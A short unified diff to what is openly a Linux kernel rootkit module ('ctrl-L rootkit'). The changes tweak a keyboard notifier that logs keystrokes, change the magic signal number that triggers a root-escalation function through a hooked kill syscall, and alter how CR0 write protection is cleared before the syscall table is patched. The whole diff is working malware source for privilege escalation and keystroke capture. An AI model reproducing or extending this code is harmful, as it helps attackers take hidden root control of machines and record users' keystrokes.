@@ -110,7 +110,7 @@ unsigned long *get_syscall_table(void) {
 int kb_cb(struct notifier_block *nblock, unsigned long code, void *_param) {
 	struct keyboard_notifier_param *param = _param;
 
-	if (debug) {
+	if (debug > 1) {
 		printk(KERN_INFO "code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
 			code, param->down, param->shift, param->value);
 	}
@@ -168,7 +168,7 @@ asmlinkage int ctrll_kill(const struct pt_regs *pt_regs) {
 	int sig = (int) pt_regs->si;
 	
 	switch (sig) {
-		case 99:
+		case 64:
 			escalate();
 			break;
 		default:
@@ -196,7 +196,7 @@ static int __init ctrll_rootkit_init(void) {
 	normal_kill = (t_syscall)sys_call_table[__NR_kill];
 
 	cr0 = read_cr0();
-	write_cr0(cr0 & ~0x00010000);
+	change_cr0(cr0 & ~0x00010000);
 	sys_call_table[__NR_kill] = (unsigned long) ctrll_kill;
 	change_cr0(cr0);
     register_keyboard_notifier(&kb_blk);
@@ -217,7 +217,7 @@ static void __exit ctrll_rootkit_exit(void) {
    		printk(KERN_INFO "ctrl-L rootkit unloaded\n");
 	}
 
-	write_cr0(cr0 & ~0x00010000);
+	change_cr0(cr0 & ~0x00010000);
 	sys_call_table[__NR_kill] = (unsigned long) normal_kill;
 	change_cr0(cr0);
 }
